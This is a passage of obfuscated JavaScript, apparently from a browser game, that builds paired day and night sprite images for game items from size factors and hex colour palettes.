			ⵠⲆ[Ⲇ.ᐃᐃΔⵠᐃⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, ["#04323c", "#03222b"]));
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, ["#13a56d", "#098a58"]));
			ⵠⲆ[Ⲇ.ⲆΔⵠᐃΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆᐃΔⵠ(.8 * ᐃ, true, [ⵠ[ᐃⵠΔⵠⵠ], ⵠ[148]]));
			ⵠⲆ[Ⲇ.ΔⲆⲆᐃⵠᐃⵠ] = ᐃⲆⲆᐃ(1, [{
				f: ⵠᐃΔᐃᐃⵠⲆ,
				x: 0,
				y: 0,
				a: ΔᐃⲆⵠ,
				r: 0,
				c: [ⵠ[496], ⵠ[578]]
			}], 1.2, [ⵠ[257], ⵠ[43], ⵠ[370]], .7);
			ⵠⲆ[Ⲇ.ⲆΔᐃΔⵠⲆⲆ] = ᐃⲆⲆᐃ(ΔΔΔ, [{
				f: ⵠⲆᐃΔᐃⵠⵠ,
				x: ⵠᐃⲆᐃ,
				y: 0,
				a: ΔⵠΔⵠ,
				r: -Math.PI / 5,
				c: [ⵠ[516], ⵠ[382]]
			}], .3, [ⵠ[257], ⵠ[43], ⵠ[370]], .7);
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠⵠⲆ] = ᐃⲆⲆᐃ(ⵠΔⲆ, [{
				f: ΔⵠΔⲆΔΔⲆ,
				x: 0,
				y: -ᐃⲆⵠΔ,
				a: ⵠᐃⵠΔ,
				r: ⲆⲆⲆᐃ,
				c: [ⵠ[341], "#bf8d51", "#7d5133", "#e8d6bf", "#e0c8a9", "#ab7a3f"]
			}], .15, [ⵠ[257], ⵠ[43], ⵠ[370]], .7);
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⵠⲆΔ] = ᐃⲆⲆᐃ(.9, [], .3, [ⵠ[350], ⵠ[350], ⵠ[350]], .5);
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ᐃⵠⵠⲆᐃ, ["#7d613e", "#9e7e5a"]));
			ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⵠⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ᐃⵠΔⵠⲆ, ["#084442", "#125e5a"]));
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ΔⵠΔⲆΔ, [ⵠ[578], ⵠ[496]]));
			ⵠⲆ[Ⲇ.ⲆⵠⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ⲆⲆᐃⵠᐃ, ["#1b6f6a", "#0d4e4c"]));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, [ⵠ[565], ⵠ[1]]));
			ⵠⲆ[Ⲇ.ΔΔⲆΔΔᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ΔᐃⵠᐃⲆ, [ⵠ[87], ⵠ[152]]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ⲆΔⲆᐃΔ, [ⵠ[537], "#ec952d"]));
			ⵠⲆ[Ⲇ.ᐃΔⵠⵠΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#0e6553", "#094437"]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⲆᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⲆᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#375809", "#4b770e"]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⲆᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ⵠᐃΔΔⵠ, ["#09542d", "#0d5d2f"]));
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ⲆⵠΔⵠΔ, ["#585809", "#72770e"]));
			ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ⵠᐃⵠᐃᐃ, ["#295209", "#305d0d"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔΔΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ⲆⲆᐃⵠᐃ, ["#b9b094", "#e2d2c0"]));
			ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#126366", "#0d484b"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ⲆⲆⲆᐃⵠ, ["#3f8662", "#30915d"]));
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠᐃⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#0e6553", "#094437"]));
			ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ᐃⲆᐃⵠΔ, ["#c79153", "#dfa868"]));
			ⵠⲆ[Ⲇ.ΔⵠᐃᐃⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#073927", "#075040"]));
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#768b5b", "#819984"]));
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ⲆΔⵠⲆΔ, ["#0c4540", "#0e5153"]));
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆᐃᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆᐃᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#567465", "#627c6e"]));
			ⵠⲆ[Ⲇ.ΔⲆᐃⲆᐃᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ᐃⵠⵠⲆᐃ, ["#073927", "#075040"]));
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠⵠⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠⵠⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#996b3a", "#bf956b"]));
			ⵠⲆ[Ⲇ.ⲆᐃΔⵠⵠⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ⵠᐃⵠᐃᐃ, ["#0e6553", "#094437"]));
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃⵠΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#7a634a", "#a68f77"]));
			ⵠⲆ[Ⲇ.ⲆⵠⵠᐃⵠΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#1e4d43", "#113c32"]));
			ⵠⲆ[Ⲇ.ᐃΔΔⲆᐃᐃΔ] = [];
			ⵠⲆ[Ⲇ.ᐃΔΔⲆᐃᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, ᐃⲆᐃⵠΔ, ["#99403c", "#bc796c"]));
			ⵠⲆ[Ⲇ.ᐃΔΔⲆᐃᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#1e434d", "#11303c"]));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#88504e", "#b3857c"]));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⲆⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#253b41", "#162930"]));
			ⵠⲆ[Ⲇ.Ⲇⵠᐃᐃⵠⵠⵠ] = [];
			ⵠⲆ[Ⲇ.Ⲇⵠᐃᐃⵠⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(.9 * ᐃ, false, ["#0f8870", "#23af93"]));
			ⵠⲆ[Ⲇ.Ⲇⵠᐃᐃⵠⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ⲆⲆⲆᐃⵠ, ["#032829", "#083233"]));
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, ⲆΔᐃⲆΔ, ["#618a20", "#84a74e"]));
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠΔᐃⲆᐃ(ᐃ * .9, false, ["#1f4632", "#335d47"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠᐃⵠⵠⲆⲆⲆ(ᐃ * 1.2, ᐃⲆᐃᐃⲆ, [ⵠ[111], ⵠ[516], ⵠ[382], "#756e52", "#663f22", "#9e9577"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠᐃⵠⵠⲆⲆⲆ(ᐃ * 1.2, true, [ⵠ[453], ⵠ[533], "#072322", "#3e706b", "#123d3f", "#4e827c"]));
			ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃ] = [], ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆᐃⲆⵠⲆ(ᐃ * ΔⵠⲆΔ, ᐃⲆⲆᐃΔ, [ⵠ[111], ⵠ[387], ⵠ[549], ⵠ[0], ⵠ[549], ⵠ[387]]));
			ⵠⲆ[Ⲇ.ⲆΔΔⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆᐃⲆⵠⲆ(1 * ᐃ, true, [ⵠ[453], ⵠ[533], ⵠ[149], ⵠ[524], ⵠ[533], "#174444"]));
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃᐃ] = [], ⵠⲆ[Ⲇ.ⲆΔⲆᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠⲆᐃᐃᐃⵠ(1 * ᐃ, true, [ⵠ[111], ⵠ[94], ⵠ[114], ⵠ[509], ⵠ[98], ⵠ[92], ⵠ[572]]));
			ⵠⲆ[Ⲇ.ⲆΔⲆᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠⲆᐃᐃᐃⵠ(ᐃ * ⵠⲆΔ, true, [ⵠ[453], ⵠ[62], ⵠ[420], ⵠ[420], "#4bbcb4", ⵠ[12], ⵠ[365]]));
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠ] = [], ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆᐃⵠⲆᐃⲆ(ᐃ * ᐃⲆᐃ, true, [ⵠ[111], ⵠ[56], ⵠ[116], ⵠ[397], ⵠ[431], ⵠ[542]]));
			ⵠⲆ[Ⲇ.ᐃΔᐃΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆᐃⵠⲆᐃⲆ(1 * ᐃ, true, [ⵠ[453], ⵠ[436], ⵠ[459], "#8f65de", "#7f55cc", "#9d77e6"]));
			ⵠⲆ[Ⲇ.ΔⵠΔⲆⲆ] = [], ⵠⲆ[Ⲇ.ΔⵠΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆᐃⵠⲆᐃⲆ(1 * ᐃ, ᐃΔᐃⵠΔ, [ⵠ[111], ⵠ[144], ⵠ[260], ⵠ[413], ⵠ[288], ⵠ[221]]));
			ⵠⲆ[Ⲇ.ΔⵠΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆᐃⵠⲆᐃⲆ(ⵠΔΔ * ᐃ, true, [ⵠ[453], ⵠ[88], "#214c4b", ⵠ[171], "#295957", "#1f5955"]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆ] = [], ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⵠᐃΔᐃⵠⵠ(ᐃ * ⵠΔΔ, ⲆᐃΔⲆⲆ, [ⵠ[111], ⵠ[328], ⵠ[227], ⵠ[ⵠᐃⵠⲆⲆ], ⵠ[31], ⵠ[167]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⵠᐃΔᐃⵠⵠ(ᐃ * ΔⵠΔⵠ, true, [ⵠ[453], ⵠ[171], "#215e55", "#1f6058", "#2a7773", "#2c7a70"]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠΔⲆ] = [], ⵠⲆ[Ⲇ.ⵠⵠⵠΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃΔᐃⲆⲆΔⲆ(.8 * ᐃ, ⵠΔΔⵠΔⵠᐃ, [ⵠ[111], ⵠ[237], ⵠ[24], ⵠ[387], ⵠ[549], ⵠ[ᐃⵠΔ], ⵠ[549], ⵠ[387]]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃΔᐃⲆⲆΔⲆ(.8 * ᐃ, true, [ⵠ[453], ⵠ[132], ⵠ[252], ⵠ[533], ⵠ[149], ⵠ[524], ⵠ[533], "#174444"]));
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠΔ] = [], ⵠⲆ[Ⲇ.ⲆΔⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃⵠⲆᐃᐃⵠ(.8 * ᐃ, ⵠⲆⵠⵠΔ, [ⵠ[111], "#69685a", "#9c9683", ⵠ[328], ⵠ[227], ⵠ[17], ⵠ[31], ⵠ[167]]));
			ⵠⲆ[Ⲇ.ⲆΔⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃⵠⲆᐃᐃⵠ(ᐃ * .8, true, [ⵠ[453], "#1a3732", "#1e544c", ⵠ[171], "#215e55", "#1f6058", "#2a7773", "#2c7a70"]));
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠⲆ] = [], ⵠⲆ[Ⲇ.ⲆⲆΔⵠⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⵠᐃΔΔᐃⲆ(.8 * ᐃ, ᐃⲆⲆᐃΔ, [ⵠ[111], "#7d8b90", "#9facaa", ⵠ[94], ⵠ[114], ⵠ[509], ⵠ[98], ⵠ[92], ⵠ[572]]));
			ⵠⲆ[Ⲇ.ⲆⲆΔⵠⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⵠᐃΔΔᐃⲆ(ᐃ * .8, ⵠⲆΔᐃⲆ, [ⵠ[453], "#2c4b55", "#546d77", ⵠ[62], ⵠ[420], ⵠ[420], "#4bbcb4", ⵠ[ⲆΔⵠᐃⲆ], ⵠ[365]]));
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃ] = [], ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃⲆⵠⲆⲆⵠ(.8 * ᐃ, ⲆⲆⲆΔⲆ, [ⵠ[111], ⵠ[144], ⵠ[24], ⵠ[144], ⵠ[260], ⵠ[413], ⵠ[288], ⵠ[221]]));
			ⵠⲆ[Ⲇ.ⲆΔᐃΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃⲆⵠⲆⲆⵠ(ᐃ * .8, true, [ⵠ[453], ⵠ[132], ⵠ[252], ⵠ[88], "#214c4b", ⵠ[171], "#295957", "#1f5955"]));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃ] = [], ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃⲆⵠⲆⲆⵠ(ᐃ * .8, ⲆⵠⲆᐃⲆΔΔ, [ⵠ[111], ⵠ[144], ⵠ[24], ⵠ[56], ⵠ[116], ⵠ[397], ⵠ[431], ⵠ[542]]));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆᐃⲆⵠⲆⲆⵠ(ᐃ * .8, ⲆⲆΔⲆⲆ, [ⵠ[453], ⵠ[132], ⵠ[252], ⵠ[436], ⵠ[459], "#8f65de", "#7f55cc", "#9d77e6"]));
			ⵠⲆ[Ⲇ.ΔⵠΔᐃⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ΔⵠΔᐃⵠᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃⲆᐃΔᐃ(ᐃ * 1.5, ⲆⲆΔⲆⲆ, [ⵠ[111], ⵠ[80], ⵠ[261], "#644928", ⵠ[261], "#735534", "#23a54e", "#1f934a", "#208e48", "#b12c2a", "#9c2625", "#ebd6a4", "#cca73f"]));
			ⵠⲆ[Ⲇ.ΔⵠΔᐃⵠᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃⲆᐃΔᐃ(1.5 * ᐃ, true, [ⵠ[453], ⵠ[533], ⵠ[149], ⵠ[524], ⵠ[533], "#174444"]));
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔⵠᐃⲆᐃΔᐃ(ᐃ * 1, ᐃᐃⵠΔⵠ, [ⵠ[30], ⵠ[30], ⵠ[64], ⵠ[64], ⵠ[30], ⵠ[64]]));
			ⵠⲆ[Ⲇ.ⵠᐃΔᐃΔΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔⵠᐃⲆᐃΔᐃ(ᐃ * ᐃᐃⲆΔ, false, [ⵠ[331], ⵠ[331], "#0b342b", "#0b342b", ⵠ[331], "#0b342b"]));
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * 1.5, ᐃᐃⲆᐃᐃ, [ⵠ[111], ⵠ[144], ⵠ[260], ⵠ[413], ⵠ[221], ⵠ[288]]));
			ⵠⲆ[Ⲇ.ⵠⲆᐃᐃⲆⵠⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * 1.5, ΔΔⲆⲆΔ, [ⵠ[453], ⵠ[88], "#214c4b", ⵠ[171], "#164542", "#295957"]));
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃΔⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * 1, false, [ⵠ[30], ⵠ[30], ⵠ[64], ⵠ[64], ⵠ[30], ⵠ[64]]));
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃΔⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * ⵠΔⵠΔ, false, [ⵠ[266], ⵠ[266], ⵠ[498], ⵠ[498], ⵠ[266], ⵠ[498]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(1.5 * ᐃ, true, [ⵠ[111], ⵠ[56], ⵠ[116], ⵠ[397], ⵠ[431], ⵠ[542]]));
			ⵠⲆ[Ⲇ.ⲆᐃᐃΔⲆᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(1.5 * ᐃ, ⵠⵠⲆⲆΔ, [ⵠ[453], ⵠ[436], ⵠ[459], "#8f65de", "#7f55cc", "#9d77e6"]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠᐃΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠᐃΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * ΔΔᐃⵠ, ᐃᐃΔᐃΔ, [ⵠ[30], ⵠ[30], ⵠ[64], ⵠ[64], ⵠ[30], ⵠ[64]]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠⵠᐃΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⵠⵠⵠ(ᐃ * ᐃΔᐃⲆ, false, [ⵠ[266], ⵠ[266], ⵠ[498], ⵠ[498], ⵠ[266], ⵠ[498]]));
			ⵠⲆ[Ⲇ.ΔⵠΔΔⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⵠΔΔⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⲆⲆⲆ(ᐃ * 1.5, ⲆⵠⵠᐃⲆ, [ⵠ[111], ⵠ[328], ⵠ[227], ⵠ[ΔⲆⲆΔΔ], "#9a8636", ⵠ[167]]));
			ⵠⲆ[Ⲇ.ΔⵠΔΔⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⲆⲆⲆ(ᐃ * 1.5, true, [ⵠ[453], ⵠ[171], "#215e55", "#1f6058", "#1f605c", "#2c7a70"]));
			ⵠⲆ[Ⲇ.ΔΔᐃⲆᐃᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔᐃⲆᐃᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⲆⲆⲆ(ᐃ * 1, false, [ⵠ[30], ⵠ[30], ⵠ[64], ⵠ[64], ⵠ[30], ⵠ[64]]));
			ⵠⲆ[Ⲇ.ΔΔᐃⲆᐃᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⲆⲆⲆ(ᐃ * ΔᐃᐃⲆ, false, [ⵠ[266], ⵠ[266], ⵠ[498], ⵠ[498], ⵠ[266], ⵠ[498]]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆΔᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⲆᐃⵠⵠ(1.5 * ᐃ, true, [ⵠ[111], ⵠ[94], ⵠ[114], ⵠ[509], ⵠ[98], ⵠ[92], ⵠ[572]]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⵠⲆΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⲆᐃⵠⵠ(1.5 * ᐃ, true, [ⵠ[453], ⵠ[62], ⵠ[420], ⵠ[420], "#4bbcb4", ⵠ[ᐃᐃΔᐃⲆ], ⵠ[365]]));
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⵠᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⲆᐃⵠⵠ(ΔΔΔ * ᐃ, false, [ⵠ[30], ⵠ[30], ⵠ[64], ⵠ[64], ⵠ[30], ⵠ[64]]));
			ⵠⲆ[Ⲇ.ΔᐃⵠᐃⲆⵠᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⲆᐃⵠⵠ(ᐃ * 1, ΔⵠΔⲆΔ, [ⵠ[266], ⵠ[266], ⵠ[498], ⵠ[498], ⵠ[266], ⵠ[498]]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃⲆᐃᐃᐃᐃ(.5 * ᐃ, true, [ⵠ[30], "#9e8838", ⵠ[40], ⵠ[80], ⵠ[ⵠᐃⵠⵠⲆ], ⵠ[16], ⵠ[ΔᐃᐃΔⵠ], ⵠ[40], ⵠ[40], ⵠ[40]]));
			ⵠⲆ[Ⲇ.ⵠⵠⵠᐃⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃⲆᐃᐃᐃᐃ(ᐃ * .5, true, [ⵠ[266], "#266161", ⵠ[402], ⵠ[351], ⵠ[184], ⵠ[184], ⵠ[184], ⵠ[402], ⵠ[402], ⵠ[402]]));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃⵠΔΔ(.5 * ᐃ, [ⵠ[30], "#9e8838", ⵠ[40], ⵠ[80], ⵠ[ᐃᐃΔⵠⵠⵠΔ]]));
			ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⵠⲆⵠᐃⵠΔΔ(ᐃ * .5, [ⵠ[266], "#266161", ⵠ[402], ⵠ[351], ⵠ[184]]));
			ⵠⲆ[Ⲇ.ᐃᐃᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃᐃᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆᐃⲆⲆᐃᐃᐃ(ᐃ * .9, [ⵠ[434], "#ee97bf", ⵠ[210], ⵠ[339], ⵠ[407]]));
